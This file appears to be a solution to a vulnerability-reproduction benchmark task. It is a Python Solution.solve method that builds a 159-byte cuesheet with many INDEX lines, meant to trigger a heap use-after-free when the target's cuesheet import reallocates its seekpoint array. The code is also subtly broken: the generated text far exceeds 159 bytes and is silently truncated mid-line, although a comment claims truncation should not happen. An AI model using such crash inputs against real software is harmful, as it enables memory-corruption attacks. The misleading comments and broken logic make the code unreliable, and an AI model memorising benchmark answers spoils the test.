import os
import tempfile
import subprocess
import struct
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This creates a minimal cuesheet that triggers the heap use-after-free
        # when the cuesheet import operation appends seekpoints and reallocates
        
        # The PoC should be exactly 159 bytes as specified
        # Format: cuesheet with multiple seekpoints that causes reallocation
        
        # Build a cuesheet that will cause multiple reallocations
        # and trigger use-after-free when old pointer is accessed
        
        # Cuesheet format basics:
        # FILE "file.bin" BINARY
        #   TRACK 01 MODE1/2352
        #     INDEX 01 00:00:00
        #     INDEX 02 00:02:00
        #     ... etc
        
        # Create a cuesheet with enough seekpoints to trigger reallocation
        # and use-after-free
        
        lines = []
        lines.append('FILE "dummy.bin" BINARY')
        lines.append('  TRACK 01 MODE1/2352')
        
        # Add multiple INDEX entries to trigger reallocation
        # The exact number and pattern needed to trigger the bug
        for i in range(1, 31):  # 30 indexes should trigger reallocation
            mm = (i * 2) // 60
            ss = (i * 2) % 60
            ff = 0
            lines.append(f'    INDEX {i:02d} {mm:02d}:{ss:02d}:{ff:02d}')
        
        cuesheet = '\n'.join(lines)
        
        # Ensure exact length of 159 bytes
        cuesheet_bytes = cuesheet.encode('utf-8')
        
        if len(cuesheet_bytes) > 159:
            # Truncate if too long (shouldn't happen with current parameters)
            cuesheet_bytes = cuesheet_bytes[:159]
        elif len(cuesheet_bytes) < 159:
            # Pad with spaces and newline to reach 159 bytes
            padding = b' ' * (159 - len(cuesheet_bytes) - 1) + b'\n'
            cuesheet_bytes = cuesheet_bytes + padding
        
        # Final check
        if len(cuesheet_bytes) != 159:
            # Adjust to exactly 159 bytes
            cuesheet_bytes = cuesheet_bytes[:159]
            if len(cuesheet_bytes) < 159:
                cuesheet_bytes = cuesheet_bytes.ljust(159, b' ')
        
        return cuesheet_bytes